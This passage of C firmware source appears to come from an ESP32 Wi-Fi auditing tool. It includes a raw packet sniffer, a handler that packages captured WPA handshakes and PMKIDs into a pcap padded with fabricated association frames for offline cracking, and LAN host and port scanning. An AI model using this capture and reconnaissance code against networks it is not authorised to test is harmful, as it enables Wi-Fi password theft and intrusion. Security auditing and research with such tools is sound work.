    uint32_t subtype = 0;

    if(json) {
        // Estrai parametri dal JSON
        cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
        cJSON *j_hop = cJSON_GetObjectItem(json, "hopping");
        cJSON *j_type = cJSON_GetObjectItem(json, "type");
        cJSON *j_sub = cJSON_GetObjectItem(json, "subtype");

        if(j_chan) channel = j_chan->valueint;
        if(j_hop) hopping = cJSON_IsTrue(j_hop);
        if(j_type) type = j_type->valueint;
        
        // Usa valuedouble per sicurezza con numeri grandi (0xFFFFFFFF) in JSON
        if(j_sub) subtype = (uint32_t)j_sub->valuedouble; 
        
        cJSON_Delete(json);
    }

    wifi_start_sniffing();

    // 3. Gestione Canale / Hopping
    if (hopping) {
        wifi_sniffer_set_fine_filter(type, subtype, 0);
        wifi_sniffer_start_channel_hopping(0); 
    } else {
        wifi_sniffer_set_fine_filter(type, subtype, channel);
        wifi_sniffer_start_channel_hopping(channel);
    }
    
    api_send_status_frame(req, "ok", "Sniffer Started");
    return ESP_OK;
}


static esp_err_t api_stop_raw_sniffer(ws_frame_req_t *req)
{
    wifi_stop_sniffing();
    api_send_status_frame(req, "ok", "Sniffer Stopped");
    return ESP_OK;
}


static esp_err_t api_wifi_connect(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    char ssid[32] = {0};
    char password[64] = {0};

    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");

    if (cJSON_IsString(j_ssid)) strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
    if (cJSON_IsString(j_password)) strlcpy(password, j_password->valuestring, sizeof(password));

    cJSON_Delete(json);

    if(wifi_connect(ssid, password) != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to connect to WiFi");
        return ESP_FAIL;
    }

    /* Save last credentials */
    save_string_to_nvs(WIFI_CONNECTION_LAST_SSID_KEY, ssid);
    save_string_to_nvs(WIFI_CONNECTION_LAST_PASS_KEY, password);

    api_send_status_frame(req, "ok", "Connection Attempted");
    return ESP_OK;
}


static esp_err_t api_wifi_disconnect(ws_frame_req_t *req)
{
    if(esp_wifi_disconnect() != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to disconnect from WiFi");
        return ESP_FAIL;
    }
    api_send_status_frame(req, "ok", "Disconnected from WiFi");
    return ESP_OK;
}


static esp_err_t api_download_handshake(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON payload");
        return ESP_FAIL;
    }
 
    cJSON *j_bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
    if (!cJSON_IsString(j_bssid)) {
        cJSON_Delete(json);
        api_send_status_frame(req, "error", "Missing BSSID string");
        return ESP_OK;
    }
 
    uint8_t target_bssid[6];
    sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);
    cJSON_Delete(json);
 
    handshake_info_t hs;
    if (wifi_sniffer_get_handshake_for_target(target_bssid, NULL, &hs) != ESP_OK ||
       (!hs.handshake_captured && !hs.pmkid_captured)) {
        api_send_status_frame(req, "error", "Handshake data not found for this AP");
        return ESP_OK;
    }
 
    size_t ssid_len = strlen((char*)hs.ssid);
    size_t pcap_hdr_sz = 24;
    size_t pkt_hdr_sz = 16;
    size_t rt_hdr_sz = 8;
 
    // --- SEC MIXED MODE (WPA1 + WPA2) ---
    const uint8_t sec_ie[] = {
        // WPA1 IE (TKIP)
        0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
        0x00, 0x50, 0xf2, 0x02, 0x01, 0x00, 0x00, 0x50,
        0xf2, 0x02, 0x01, 0x00, 0x00, 0x50, 0xf2, 0x02,
        // WPA2 RSN IE (CCMP)
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
        0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
        0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
    };
    size_t sec_ie_len = sizeof(sec_ie);
 
    const uint8_t rates_ie[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
    const uint8_t ds_ie[] = { 0x03, 0x01, 0x01 }; // Ch 1 fallback
    const uint8_t wildcard_ssid_ie[] = { 0x00, 0x00 }; // Tag SSID, len 0 -> probe request undirected
 
    // --- PROBE REQUEST (undirected, STA -> broadcast) ---
    size_t probereq_sz = rt_hdr_sz + 24 + sizeof(wildcard_ssid_ie) + sizeof(rates_ie);
 
    size_t beacon_sz = rt_hdr_sz + 24 + 12 + 2 + ssid_len + sizeof(rates_ie) + sizeof(ds_ie) + sec_ie_len;
    size_t auth_sz   = rt_hdr_sz + 24 + 6;
    size_t assoc_sz  = rt_hdr_sz + 24 + 4 + 2 + ssid_len + sizeof(rates_ie) + sec_ie_len;
 
    bool m1_llc = (hs.eapol_m1_len >= 8 && hs.eapol_m1[0] == 0xaa && hs.eapol_m1[1] == 0xaa);
    bool m2_llc = (hs.eapol_m2_len >= 8 && hs.eapol_m2[0] == 0xaa && hs.eapol_m2[1] == 0xaa);
    bool m3_llc = (hs.eapol_m3_len >= 8 && hs.eapol_m3[0] == 0xaa && hs.eapol_m3[1] == 0xaa);
    bool m4_llc = (hs.eapol_m4_len >= 8 && hs.eapol_m4[0] == 0xaa && hs.eapol_m4[1] == 0xaa);
 
    size_t m1_sz = rt_hdr_sz + 26 + (m1_llc ? 0 : 8) + hs.eapol_m1_len;
    size_t m2_sz = rt_hdr_sz + 26 + (m2_llc ? 0 : 8) + hs.eapol_m2_len;
    size_t m3_sz = rt_hdr_sz + 26 + (m3_llc ? 0 : 8) + hs.eapol_m3_len;
    size_t m4_sz = rt_hdr_sz + 26 + (m4_llc ? 0 : 8) + hs.eapol_m4_len;
    size_t total_sz = pcap_hdr_sz + (5 * pkt_hdr_sz) + probereq_sz + beacon_sz + auth_sz + assoc_sz + m1_sz;
    if (hs.handshake_captured) {
        total_sz += pkt_hdr_sz + m2_sz + pkt_hdr_sz + m3_sz + pkt_hdr_sz + m4_sz;
    }
 
    uint8_t *pcap = calloc(1, total_sz);
    if (!pcap) return ESP_ERR_NO_MEM;
 
    size_t offset = 0;
 
    // Global Header
    const uint8_t pcap_hdr[] = {
        0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x00
    };
    memcpy(pcap + offset, pcap_hdr, 24); offset += 24;
 
    uint32_t ts_sec = 1700000000;
    uint32_t ts_usec = 0;
 
    #define WRITE_PKT_HDR(len) do { \
        memcpy(pcap + offset, &ts_sec, 4); offset += 4; \
        memcpy(pcap + offset, &ts_usec, 4); offset += 4; \
        uint32_t l = len; \
        memcpy(pcap + offset, &l, 4); offset += 4; \
        memcpy(pcap + offset, &l, 4); offset += 4; \
        ts_usec += 10000; \
    } while(0)
 
    uint8_t rt_hdr[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
    uint8_t llc[8] = {0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e};
 
    // 0. PROBE REQUEST (undirected, broadcast) - STA in scansione, prima ancora del beacon
    WRITE_PKT_HDR(probereq_sz);
    memcpy(pcap + offset, rt_hdr, 8); offset += 8;
    uint8_t probereq_mac_hdr[24] = {
        0x40, 0x00, 0x00, 0x00, // Type/Subtype: Probe Request, Duration 0
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Addr1 (DA): broadcast
        hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5], // Addr2 (SA/TA)
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Addr3 (BSSID): broadcast -> undirected
        0x00, 0x00 // Seq 0
    };
    memcpy(pcap + offset, probereq_mac_hdr, 24); offset += 24;
    memcpy(pcap + offset, wildcard_ssid_ie, sizeof(wildcard_ssid_ie)); offset += sizeof(wildcard_ssid_ie);
    memcpy(pcap + offset, rates_ie, sizeof(rates_ie)); offset += sizeof(rates_ie);
 
    // 1. BEACON
    WRITE_PKT_HDR(beacon_sz);
    memcpy(pcap + offset, rt_hdr, 8); offset += 8;
    uint8_t beacon_mac_hdr[24] = {
        0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        0x10, 0x00 // Seq 1
    };
    memcpy(pcap + offset, beacon_mac_hdr, 24); offset += 24;
    uint8_t beacon_fixed[12] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00, 0x11,0x04};
    memcpy(pcap + offset, beacon_fixed, 12); offset += 12;
 
    pcap[offset++] = 0x00; pcap[offset++] = ssid_len;
    memcpy(pcap + offset, hs.ssid, ssid_len); offset += ssid_len;
    memcpy(pcap + offset, rates_ie, sizeof(rates_ie)); offset += sizeof(rates_ie);
    memcpy(pcap + offset, ds_ie, sizeof(ds_ie)); offset += sizeof(ds_ie);
    memcpy(pcap + offset, sec_ie, sec_ie_len); offset += sec_ie_len;
 
    // 2. FAKE AUTHENTICATION (STA -> AP)
    WRITE_PKT_HDR(auth_sz);
    memcpy(pcap + offset, rt_hdr, 8); offset += 8;
    uint8_t auth_mac_hdr[24] = {
        0xb0, 0x00, 0x00, 0x00,
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        0x20, 0x00 // Seq 2
    };
    memcpy(pcap + offset, auth_mac_hdr, 24); offset += 24;
    uint8_t auth_fixed[6] = {0x00, 0x00, 0x01, 0x00, 0x00, 0x00}; // Open System, Seq 1, Status 0
    memcpy(pcap + offset, auth_fixed, 6); offset += 6;
 
    // 3. FAKE ASSOC REQUEST (STA -> AP)
    WRITE_PKT_HDR(assoc_sz);
    memcpy(pcap + offset, rt_hdr, 8); offset += 8;
    uint8_t assoc_mac_hdr[24] = {
        0x00, 0x00, 0x00, 0x00, // Assoc Req Frame
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        0x30, 0x00 // Seq 3
    };
    memcpy(pcap + offset, assoc_mac_hdr, 24); offset += 24;
    uint8_t assoc_fixed[4] = {0x11, 0x04, 0x0a, 0x00}; // Capability, Listen Interval
    memcpy(pcap + offset, assoc_fixed, 4); offset += 4;
    pcap[offset++] = 0x00; pcap[offset++] = ssid_len;
    memcpy(pcap + offset, hs.ssid, ssid_len); offset += ssid_len;
    memcpy(pcap + offset, rates_ie, sizeof(rates_ie)); offset += sizeof(rates_ie);
    memcpy(pcap + offset, sec_ie, sec_ie_len); offset += sec_ie_len;
 
    // 4. M1 (AP -> STA)
    WRITE_PKT_HDR(m1_sz);
    memcpy(pcap + offset, rt_hdr, 8); offset += 8;
    uint8_t m1_mac_hdr[26] = {
        0x88, 0x02, 0x00, 0x00,
        hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
        0x40, 0x00, 0x00, 0x00 // Seq 4
    };
    memcpy(pcap + offset, m1_mac_hdr, 26); offset += 26;
    if (!m1_llc) { memcpy(pcap + offset, llc, 8); offset += 8; }
    memcpy(pcap + offset, hs.eapol_m1, hs.eapol_m1_len); offset += hs.eapol_m1_len;
 
    // 5. M2 (STA -> AP)
    if (hs.handshake_captured) {
        WRITE_PKT_HDR(m2_sz);
        memcpy(pcap + offset, rt_hdr, 8); offset += 8;
        uint8_t m2_mac_hdr[26] = {
            0x88, 0x01, 0x00, 0x00,
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            0x50, 0x00, 0x00, 0x00 // Seq 5
        };
        memcpy(pcap + offset, m2_mac_hdr, 26); offset += 26;
        if (!m2_llc) { memcpy(pcap + offset, llc, 8); offset += 8; }
        memcpy(pcap + offset, hs.eapol_m2, hs.eapol_m2_len); offset += hs.eapol_m2_len;
    }
 
    // 6. M3 (AP -> STA)
    if (hs.handshake_captured) {
        WRITE_PKT_HDR(m3_sz);
        memcpy(pcap + offset, rt_hdr, 8); offset += 8;
        uint8_t m3_mac_hdr[26] = {
            0x88, 0x02, 0x00, 0x00,
            hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            0x60, 0x00, 0x00, 0x00 // Seq 6
        };
        memcpy(pcap + offset, m3_mac_hdr, 26); offset += 26;
        if (!m3_llc) { memcpy(pcap + offset, llc, 8); offset += 8; }
        memcpy(pcap + offset, hs.eapol_m3, hs.eapol_m3_len); offset += hs.eapol_m3_len;
    }
 
    // 7. M4 (STA -> AP)
    if (hs.handshake_captured) {
        WRITE_PKT_HDR(m4_sz);
        memcpy(pcap + offset, rt_hdr, 8); offset += 8;
        uint8_t m4_mac_hdr[26] = {
            0x88, 0x01, 0x00, 0x00,
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            hs.mac_sta[0], hs.mac_sta[1], hs.mac_sta[2], hs.mac_sta[3], hs.mac_sta[4], hs.mac_sta[5],
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5],
            0x70, 0x00, 0x00, 0x00 // Seq 7
        };
        memcpy(pcap + offset, m4_mac_hdr, 26); offset += 26;
        if (!m4_llc) { memcpy(pcap + offset, llc, 8); offset += 8; }
        memcpy(pcap + offset, hs.eapol_m4, hs.eapol_m4_len); offset += hs.eapol_m4_len;
    }
 
    #undef WRITE_PKT_HDR
 
    // BASE64 Encoding
    size_t b64_len = 0;
    mbedtls_base64_encode(NULL, 0, &b64_len, pcap, total_sz);
    char *b64_buf = malloc(b64_len + 1);
    if (b64_buf) {
        mbedtls_base64_encode((uint8_t*)b64_buf, b64_len, &b64_len, pcap, total_sz);
        b64_buf[b64_len] = 0;
 
        cJSON *root = cJSON_CreateObject();
        cJSON_AddNumberToObject(root, "req_id", req->req_id);
        cJSON_AddStringToObject(root, "type", "pcap_file");
 
        char out_filename[64];
        snprintf(out_filename, sizeof(out_filename), "handshake_%s.pcap", hs.ssid);
        cJSON_AddStringToObject(root, "filename", out_filename);
        cJSON_AddStringToObject(root, "payload", b64_buf);
 
        char *json_resp = cJSON_PrintUnformatted(root);
        cJSON_Delete(root);
        free(b64_buf);
 
        if (json_resp) {
            ws_frame_req_t cmd;
            cmd.hd = req->hd; cmd.fd = req->fd;
            cmd.payload = json_resp; cmd.len = strlen(json_resp);
            cmd.need_free = true;
            ws_send_command_to_queue(&cmd);
        }
    }
    free(pcap);
    
    api_send_status_frame(req, "ok", "PCAP Downloaded");
    return ESP_OK;
}


static esp_err_t api_start_packet_analyzer(ws_frame_req_t *req)
{
    wifi_sniffer_start_packet_analyzer(true);
    api_send_status_frame(req, "ok", "Packet Analyzer Started");
    return ESP_OK;
}


static esp_err_t api_stop_packet_analyzer(ws_frame_req_t *req)
{
    wifi_sniffer_start_packet_analyzer(false);
    api_send_status_frame(req, "ok", "Packet Analyzer Stopped");
    return ESP_OK;
}


static esp_err_t api_get_wifi_last_credentials(ws_frame_req_t *req)
{
    char ssid[32] = {0};
    char password[64] = {0};
    read_string_from_nvs(WIFI_CONNECTION_LAST_SSID_KEY, ssid);
    read_string_from_nvs(WIFI_CONNECTION_LAST_PASS_KEY, password);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "last_wifi_credentials");
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


/**
 * @brief Extract a short, human-readable label from an SSDP USN/NT header.
 *        e.g. "uuid:xxx::urn:schemas-upnp-org:device:MediaRenderer:1" -> "MediaRenderer"
 *             "uuid:xxx::urn:schemas-upnp-org:service:AVTransport:1"  -> "AVTransport"
 *             "uuid:xxx::upnp:rootdevice"                             -> "Root Device"
 *             "uuid:xxx" (bare)                                       -> "UPnP Device"
 */
static void extract_ssdp_type(const char *usn, char *out, size_t out_sz)
{
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!usn) {
        strlcpy(out, "UPnP Device", out_sz);
        return;
    }

    const char *marker = strstr(usn, ":device:");
    size_t skip = strlen(":device:");
    if (marker == NULL) {
        marker = strstr(usn, ":service:");
        skip = strlen(":service:");
    }

    if (marker != NULL) {
        marker += skip;
        const char *end = strchr(marker, ':');
        size_t len = end ? (size_t)(end - marker) : strlen(marker);
        if (len >= out_sz) len = out_sz - 1;
        memcpy(out, marker, len);
        out[len] = '\0';
        return;
    }

    if (strstr(usn, "rootdevice") != NULL) {
        strlcpy(out, "Root Device", out_sz);
        return;
    }

    strlcpy(out, "UPnP Device", out_sz);
}


/**
 * @brief Rank how descriptive an SSDP type label is, so that when the same
 *        physical device answers with several USN lines (root device, then
 *        embedded devices/services) we keep the most useful one instead of
 *        whichever happened to arrive first.
 */
static int ssdp_type_priority(const char *usn)
{
    if (!usn) return 0;
    if (strstr(usn, ":device:") != NULL) return 3;
    if (strstr(usn, ":service:") != NULL) return 2;
    if (strstr(usn, "rootdevice") != NULL) return 1;
    return 0;
}


/**
 * @brief Merge an mDNS or SSDP discovery result (parsed JSON array of objects
 *        containing at least an "ip" field) into the host list produced by
 *        subnet_scan(), attaching a "services" array to the matching host.
 *        Hosts that answered mDNS/SSDP but were missed by the ARP sweep are
 *        appended as new entries.
 */
static void merge_discovery_results(cJSON *hosts, cJSON *extra, const char *source)
{
    if (!hosts || !extra) return;

    cJSON *item;
    cJSON_ArrayForEach(item, extra) {
        cJSON *j_ip = cJSON_GetObjectItemCaseSensitive(item, "ip");
        if (!cJSON_IsString(j_ip) || j_ip->valuestring[0] == '\0') continue;

        cJSON *host = NULL;
        cJSON *h;
        cJSON_ArrayForEach(h, hosts) {
            cJSON *h_ip = cJSON_GetObjectItemCaseSensitive(h, "ip");
            if (cJSON_IsString(h_ip) && strcmp(h_ip->valuestring, j_ip->valuestring) == 0) {
                host = h;
                break;
            }
        }

        if (host == NULL) {
            /* Answered mDNS/SSDP but the ARP sweep missed it - keep it anyway */
            host = cJSON_CreateObject();
            cJSON_AddStringToObject(host, "ip", j_ip->valuestring);
            cJSON_AddStringToObject(host, "mac", "N/A");
            cJSON_AddStringToObject(host, "vendor", "Unknown Vendor");
            cJSON *j_hostname0 = cJSON_GetObjectItemCaseSensitive(item, "hostname");
            cJSON_AddStringToObject(host, "hostname",
                (cJSON_IsString(j_hostname0) && j_hostname0->valuestring[0]) ? j_hostname0->valuestring : "N/A");
            cJSON_AddItemToArray(hosts, host);
        }

        cJSON *services = cJSON_GetObjectItemCaseSensitive(host, "services");
        if (services == NULL) {
            services = cJSON_AddArrayToObject(host, "services");
        }

        if (strcmp(source, "ssdp") == 0) {
            /* A single physical UPnP device (a router, a TV...) advertises
             * itself through SEVERAL distinct USN lines - one for its root
             * device, plus one more per embedded device/service, each
             * carrying a DIFFERENT uuid (e.g. a router's IGD root, its
             * WANDevice and its WANConnectionDevice are three different
             * uuids). Deduping only by uuid let all of those through as
             * separate badges that all basically just said "it's a router"
             * in different words. Collapse to a single ssdp entry per HOST
             * instead - the real identity now comes from
             * ssdp_fetch_device_info() (see api_start_host_scan), which
             * reads the device's own friendlyName from its description
             * document rather than guessing from raw UPnP taxonomy. This
             * badge just keeps the most specific type label seen across
             * every USN line for that host, as a fallback for devices
             * where the description fetch fails or is skipped. */
            cJSON *j_usn = cJSON_GetObjectItemCaseSensitive(item, "usn");
            const char *usn_str = cJSON_IsString(j_usn) ? j_usn->valuestring : "";

            char type_label[40];
            extract_ssdp_type(usn_str, type_label, sizeof(type_label));
            int priority = ssdp_type_priority(usn_str);

            cJSON *j_location = cJSON_GetObjectItemCaseSensitive(item, "location");
            const char *location_str = cJSON_IsString(j_location) ? j_location->valuestring : "N/A";
            cJSON *j_server = cJSON_GetObjectItemCaseSensitive(item, "server");
            const char *server_str = cJSON_IsString(j_server) ? j_server->valuestring : "N/A";

            cJSON *existing = NULL;
            cJSON *svc;
            cJSON_ArrayForEach(svc, services) {
                cJSON *svc_source = cJSON_GetObjectItemCaseSensitive(svc, "source");
                if (cJSON_IsString(svc_source) && strcmp(svc_source->valuestring, "ssdp") == 0) {
                    existing = svc;
                    break;
                }
            }

            if (existing != NULL) {
                cJSON *j_prio = cJSON_GetObjectItemCaseSensitive(existing, "priority");
                int existing_priority = cJSON_IsNumber(j_prio) ? j_prio->valueint : 0;
                if (priority > existing_priority) {
                    cJSON *j_type = cJSON_GetObjectItemCaseSensitive(existing, "type");
                    if (cJSON_IsString(j_type)) cJSON_SetValuestring(j_type, type_label);
                    if (j_prio) cJSON_SetNumberValue(j_prio, priority);
                }
                cJSON *j_exist_loc = cJSON_GetObjectItemCaseSensitive(existing, "location");
                if (j_exist_loc && cJSON_IsString(j_exist_loc) &&
                    strcmp(j_exist_loc->valuestring, "N/A") == 0 && strcmp(location_str, "N/A") != 0) {
                    cJSON_SetValuestring(j_exist_loc, location_str);
                }
                continue;
            }

            cJSON *svc_obj = cJSON_CreateObject();
            cJSON_AddStringToObject(svc_obj, "source", "ssdp");
            cJSON_AddStringToObject(svc_obj, "type", type_label);
            cJSON_AddNumberToObject(svc_obj, "priority", priority);
            cJSON_AddStringToObject(svc_obj, "server", server_str);
            cJSON_AddStringToObject(svc_obj, "location", location_str);
            cJSON_AddItemToArray(services, svc_obj);
        }
        else /* mdns */
        {
            cJSON *svc_obj = cJSON_CreateObject();
            cJSON_AddStringToObject(svc_obj, "source", "mdns");
            cJSON *j_service = cJSON_GetObjectItemCaseSensitive(item, "service");
            cJSON_AddStringToObject(svc_obj, "type", cJSON_IsString(j_service) ? j_service->valuestring : "N/A");
            cJSON *j_port = cJSON_GetObjectItemCaseSensitive(item, "port");
            cJSON_AddNumberToObject(svc_obj, "port", cJSON_IsNumber(j_port) ? j_port->valueint : 0);
            cJSON *j_instance = cJSON_GetObjectItemCaseSensitive(item, "instance_name");
            cJSON_AddStringToObject(svc_obj, "name", cJSON_IsString(j_instance) ? j_instance->valuestring : "N/A");
            cJSON_AddItemToArray(services, svc_obj);

            /* Prefer the friendlier mDNS hostname if ARP couldn't resolve one */
            cJSON *h_hostname = cJSON_GetObjectItemCaseSensitive(host, "hostname");
            cJSON *j_hostname = cJSON_GetObjectItemCaseSensitive(item, "hostname");
            if (h_hostname && cJSON_IsString(h_hostname) && strcmp(h_hostname->valuestring, "N/A") == 0 &&
                cJSON_IsString(j_hostname) && j_hostname->valuestring[0]) {
                cJSON_SetValuestring(h_hostname, j_hostname->valuestring);
            }
        }
    }
}


static esp_err_t api_start_host_scan(ws_frame_req_t *req)
{
    /* Optional payload: {"include_mdns": true, "include_ssdp": true}.
     * Both default to false if no payload is sent, so a plain ARP sweep
     * stays fast unless the frontend explicitly opts in. */
    bool include_mdns = false;
    bool include_ssdp = false;

    if (req->payload && req->len > 0) {
        cJSON *opts = cJSON_Parse(req->payload);
        if (opts) {
            cJSON *j_mdns = cJSON_GetObjectItemCaseSensitive(opts, "include_mdns");
            cJSON *j_ssdp = cJSON_GetObjectItemCaseSensitive(opts, "include_ssdp");
            if (cJSON_IsBool(j_mdns)) include_mdns = cJSON_IsTrue(j_mdns);
            if (cJSON_IsBool(j_ssdp)) include_ssdp = cJSON_IsTrue(j_ssdp);
            cJSON_Delete(opts);
        }
    }

    char *scan_results_str = subnet_scan();
    if (scan_results_str == NULL) {
        api_send_status_frame(req, "error", "Failed to scan or insufficient memory");
        return ESP_FAIL;
    }

    cJSON *hosts = cJSON_Parse(scan_results_str);
    cJSON_free(scan_results_str);
    if (hosts == NULL) {
        api_send_status_frame(req, "error", "Failed to parse ARP sweep results");
        return ESP_FAIL;
    }

    if (include_mdns) {
        char *mdns_str = mdns_discover();
        if (mdns_str) {
            cJSON *mdns_array = cJSON_Parse(mdns_str);
            if (mdns_array) {
                merge_discovery_results(hosts, mdns_array, "mdns");
                cJSON_Delete(mdns_array);
            }
            cJSON_free(mdns_str);
        }
    }

    if (include_ssdp) {
        char *ssdp_str = ssdp_discover();
        if (ssdp_str) {
            cJSON *ssdp_array = cJSON_Parse(ssdp_str);
            if (ssdp_array) {
                merge_discovery_results(hosts, ssdp_array, "ssdp");
                cJSON_Delete(ssdp_array);
            }
            cJSON_free(ssdp_str);
        }

        /* One extra small HTTP GET per UPnP host, reading its own device
         * description document - this is what actually resolves a human
         * name ("Vodafone Power Station WiFi 6", "Fire TV di Stefano")
         * instead of generic UPnP taxonomy like "InternetGatewayDevice".
         * Bounded to one fetch per host (only hosts that answered SSDP),
         * so typically just a handful of extra round-trips on a home LAN. */
        cJSON *h;
        cJSON_ArrayForEach(h, hosts) {
            cJSON *services = cJSON_GetObjectItemCaseSensitive(h, "services");
            if (!services) continue;

            cJSON *svc;
            cJSON_ArrayForEach(svc, services) {
                cJSON *svc_source = cJSON_GetObjectItemCaseSensitive(svc, "source");
                if (!cJSON_IsString(svc_source) || strcmp(svc_source->valuestring, "ssdp") != 0) continue;

                cJSON *j_loc = cJSON_GetObjectItemCaseSensitive(svc, "location");
                if (!cJSON_IsString(j_loc) || strcmp(j_loc->valuestring, "N/A") == 0) break;

                char friendly[64], manufacturer[48], model[48];
                if (ssdp_fetch_device_info(j_loc->valuestring, friendly, sizeof(friendly),
                                            manufacturer, sizeof(manufacturer), model, sizeof(model))) {
                    cJSON_AddStringToObject(h, "friendly_name", friendly);
                    if (manufacturer[0]) cJSON_AddStringToObject(h, "manufacturer", manufacturer);
                    if (model[0]) cJSON_AddStringToObject(h, "model", model);
                }
                break; /* only one ssdp entry per host now, no need to keep looking */
            }
        }
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "host_scan_results");
    cJSON_AddStringToObject(root, "status", "ok");
    cJSON_AddItemToObject(root, "data", hosts);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_start_port_scan_single(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *j_ip = cJSON_GetObjectItemCaseSensitive(json, "ip");
    cJSON *j_port = cJSON_GetObjectItemCaseSensitive(json, "port");
    cJSON *j_method = cJSON_GetObjectItemCaseSensitive(json, "method");

    if (!cJSON_IsString(j_ip) || !cJSON_IsNumber(j_port) || !cJSON_IsNumber(j_method)) {
        cJSON_Delete(json);
        api_send_status_frame(req, "error", "Missing parameters for port scan");
        return ESP_FAIL;
    }

    char ip_str[32];
    strlcpy(ip_str, j_ip->valuestring, sizeof(ip_str));
    uint16_t port = (uint16_t)j_port->valueint;
    port_scan_method_t method = (port_scan_method_t)j_method->valueint;
    cJSON_Delete(json);

    ip4_addr_t target_ip;
    ip4addr_aton(ip_str, &target_ip);

    int scan_res = port_scan(target_ip, port, 0, method);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
